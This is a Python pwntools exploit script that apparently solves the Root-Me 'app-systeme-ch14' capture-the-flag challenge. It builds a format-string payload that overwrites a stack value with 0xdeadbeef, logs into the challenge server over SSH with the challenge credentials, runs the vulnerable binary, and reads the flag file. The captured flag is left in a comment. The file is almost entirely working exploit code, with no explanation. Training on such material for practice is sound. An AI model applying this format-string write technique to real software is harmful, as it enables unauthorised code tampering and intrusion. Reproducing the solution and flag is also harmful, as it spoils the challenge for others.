from pwn import *

context.log_level = 'debug'

local = 0

check = 0xbffffa18
# check = 0xffffced8

payload = fmtstr_payload(9, {check: 0xdeadbeef})

elf = ['./ch14', payload]

if local:
    p = process(elf)
else:
    p = ssh('app-systeme-ch14', 'challenge02.root-me.org', password='app-systeme-ch14', port=2222)

p.sendline("./ch14" + " " + payload)
p.sendline("cat ./.flag")
print p.recvall()

# 1l1k3p0Rn&P0pC0rn
